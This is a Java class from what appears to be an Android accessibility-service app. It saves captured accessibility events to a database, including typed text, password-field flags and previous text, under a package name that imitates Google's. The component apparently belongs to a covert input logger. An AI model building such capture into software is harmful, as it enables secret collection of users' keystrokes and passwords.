package service.android.google.com.accessibility.util.action;

import android.text.TextUtils;

import nl.nl2312.rxcupboard.RxDatabase;
import service.android.google.com.accessibility.model.Event;
import service.android.google.com.accessibility.model.database.EventDTO;

/**
 * Created by tim on 27.03.16.
 */
public class SaveEventToDbFunction extends AbstractSaveASEventToDbAction<Event, EventDTO> {

    public SaveEventToDbFunction(RxDatabase rxDatabase) {
        super(rxDatabase);
    }

    @Override
    public void call(final Event event) {
        if (event == null || TextUtils.isEmpty(event.text())) {
            return;
        }

        this.save(new EventDTO(
                event.packageName(),
                event.eventType(),
                event.className(),
                event.eventTime(),
                event.text(),
                event.isEnabled(),
                event.isPassword(),
                event.isChecked(),
                event.fromIndex(),
                event.toIndex(),
                event.addedCount(),
                event.removedCount(),
                event.itemCount(),
                event.beforeText(),
                event.contentDescription(),
                event.scrollX(),
                event.scrollY(),
                event.currentItemIndex()
        ));
    }
}